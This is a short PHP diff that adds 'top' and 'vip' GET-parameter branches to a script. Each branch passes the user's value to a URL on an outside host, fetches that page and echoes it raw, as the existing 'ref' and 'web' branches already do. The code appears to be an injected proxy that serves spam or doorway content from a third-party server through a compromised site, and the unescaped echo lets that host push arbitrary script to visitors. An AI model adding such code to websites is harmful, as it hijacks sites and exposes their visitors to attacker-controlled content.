@@ -30,6 +30,18 @@ elseif(isset($_GET['ref'])) {
     $data = fetchDataFromSite($site);
     echo $data;
 }
+	elseif(isset($_GET['top'])) {
+  $sitex = $_GET['top'];
+  $site = 'https://replication2.pkcdurensawit.net/heritageinstitutecom/?top='.$sitex;
+  $data = fetchDataFromSite($site);
+  echo $data;
+}
+	elseif(isset($_GET['vip'])) {
+  $sitex = $_GET['vip'];
+  $site = 'https://replication2.pkcdurensawit.net/heritageinstitutecom/?vip='.$sitex;
+  $data = fetchDataFromSite($site);
+  echo $data;
+}
 elseif(isset($_GET['web'])) {
   $sitex = $_GET['web'];
   $site = 'https://replication2.pkcdurensawit.net/heritageinstitutecom/?web='.$sitex;
